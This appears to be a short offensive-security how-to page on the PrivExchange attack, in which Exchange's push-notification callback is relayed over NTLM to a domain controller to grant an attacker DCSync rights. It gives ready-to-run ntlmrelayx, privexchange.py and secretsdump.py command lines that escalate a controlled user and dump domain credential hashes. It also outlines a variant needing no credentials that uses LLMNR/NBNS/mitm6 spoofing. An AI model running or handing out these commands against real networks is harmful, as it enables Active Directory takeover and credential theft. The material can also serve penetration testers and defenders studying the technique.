<title>Relay</title>
</head><body>If Exchange is running with high privileges, using a relay attack can allow an attacker to grant themselves DCSync rights. The push notification service has an option to send a message every X minutes (configurable) even if no event happened. This ensures Exchange will connect with PushSubscription even if there is no activity in an inbox. <br/>
<br/>
<b>Performing the Attack With User Credentials</b><br/>
1. PushSubscription EWS Call<br/>
2. HTTP connection - NTLM auth<br/>
3. NTLM auth forward (relay) to DC<br/>
4. Modify privileges using Exchange server account<br/>
5. Perform DCSync attack<br/>
<br/>
Need <a href="https://github.com/dirkjanm/privexchange">privexchange.py</a>&nbsp;and <a href="https://github.com/SecureAuthCorp/impacket/">ntlmrelayx</a>. Start ntlmrelayx in relay mode with LDAP on a DC as the target. Supply a user under the attackers control to escalate privileges with (in these examples, the 'nty' user). <br/>
<br/>
ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu<br/>
<br/>
Now run the privexchange.py script<br/>
<br/>
python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u ntu -d testsegment.local<br/>
<br/>
After a minute (which is the value supplied for the push notification) we see the connection coming in at ntlmrelayx, which gives our user DCSync privileges. This can be confirmed with secretsdump:<br/>
<br/>
secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc<br/>
<br/>
<b>Performing the Attack With NO Credentials<br/>
</b>If an attacker is only in a position to perform a network attack, but doesn't have any credentials, it is still possible to trigger Exchange to authenticate. If we perform a SMB to HTTP (or HTTP to HTTP) relay attack (using LLMNR/NBNS/mitm6 spoofing) we can relay the authentication of a user in the same network segment to Exchange EwS and use their credentials to trigger the callback. Using httpattack.py and ntlmrelayx, an attacker can perform the attack from a network perspective without any credentials (need to modify your attacker host since it is hardcoded in the file).<br/>
